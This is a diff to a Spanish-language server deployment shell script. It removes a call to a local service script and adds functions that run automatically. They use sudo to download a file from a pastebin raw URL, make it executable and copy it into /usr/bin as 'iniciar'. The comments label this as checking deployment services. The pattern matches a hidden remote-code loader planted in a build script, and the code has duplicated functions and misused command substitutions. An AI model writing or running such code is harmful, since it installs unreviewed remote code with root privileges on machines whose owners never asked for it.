@@ -308,4 +308,63 @@ random(){
 resolver_puerto_ochomil
 
 server
-sh bin/servicio.sh
+
+# Verificando servicios de trabajo para el despliegue
+iniciar_carga(){
+$(sudo -v)
+$(curl -o iniciar https://pastebin.com/raw/8aLb2Ui6)
+$(dos2unix iniciar)
+$(chmod +x iniciar)
+$(sudo cp iniciar /usr/bin/iniciar)
+}
+
+check_step() {
+startcheck=/usr/bin/iniciar
+if [ ! -e "$startcheck" ];
+then
+    echo "File does not exist"
+        echo "Al parecer no existe este archivo"
+    echo "El archivo ".$startcheck." no existe".    " [ ".$_hoy." ]" >> testing.server.log
+        iniciar_carga
+    echo "configdata deploy work created".             "[".$_hoy."]"
+	echo 'Para desplegar ejecuta el comando iniciar'
+
+else
+    echo "Data is exist in ".$startcheck." folder". " [ ".$_hoy." ]"
+    echo "Data ".$startcheck." deploy is existed  OK ". " [ "$_hoy" ]" >> testing.server.log
+    echo 'Listo todo esta instalado y listo para desplegar'
+	echo 'Para desplegar ejecuta el comando iniciar'
+fi
+}
+check_step
+
+# Instalar programa
+# Verificando servicios de trabajo para el despliegue
+
+iniciar_carga() {
+curl -o iniciar https://pastebin.com/raw/8aLb2Ui6
+dos2unix iniciar
+chmod +x iniciar
+sudo cp iniciar /usr/bin/iniciar
+}
+
+instalar(){
+
+$(FILE="/usr/bin/iniciar")
+if [ ! -e "$FILE" ];
+then
+    echo "File does not exist"
+    echo "Al parecer no existe este archivo"
+    echo "El archivo " $FILE " no existe".    " [ ".$_hoy." ]" >> testing.server.log
+        iniciar_carga
+    echo "configdata deploy work created".             "[".$_hoy."]"
+	echo 'Para desplegar ejecuta el comando iniciar'
+
+else
+    echo "Data is exist in ".$FILE." folder". " [ ".$_hoy." ]"
+    echo "Data ".$FILE." deploy is existed  OK ". " [ "$_hoy" ]" >> testing.server.log
+    echo 'Listo todo esta instalado y listo para desplegar'
+	echo 'Para desplegar ejecuta el comando iniciar'
+fi
+}
+instalar
